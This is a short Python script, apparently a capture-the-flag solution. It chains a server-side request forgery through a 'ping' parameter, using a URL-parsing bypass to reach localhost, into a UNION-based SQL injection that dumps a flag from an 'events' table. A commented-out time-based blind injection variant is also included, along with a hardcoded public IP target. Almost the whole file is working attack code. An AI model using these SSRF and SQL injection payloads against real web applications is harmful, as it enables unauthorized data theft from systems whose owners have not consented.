import requests 
import time 
import string 

url = "http://52.231.137.27:37221"
url = "http://localhost:37221/"
flag = "" 

# sql = f" union select 1\nfrom (select if(ascii(substr(body from {i} for 1))={ord(j)},sleep(2),0) XXX from events GROUP BY name HAVING name=\"Flag\") k; --"
sql = " union select 1\nfrom %28select 1 XXX%29 X union select body from events GROUP BY name HAVING name=%22Flag%22%3B -- ".replace(" ", "%20").replace("\n","%0A")
# sql = "Flag"
# start = time.time() 
r = requests.get(
            f"{url}", 
            params={
                "action": "ping",
                "arg": f"http://localhost:80\@.cce.cstec.kr|?action=db_show_event_detail&db_arg_event_name={sql}&db_arg_writer=&db_arg_password=",
                # "arg": f"http://localhost:80\@.cce.cstec.kr|?action=db_show_event_detail&db_arg_event_name=%0A",
                # "arg": "http://localhost:80\@.cce.cstec.kr|/?action=db_version"
            }
        )
        # end = time.time() 
        # print(r.text)
print(r.text)
        # if end - start >= 2: 
        #     flag += j
        #     print(flag) 
        #     break 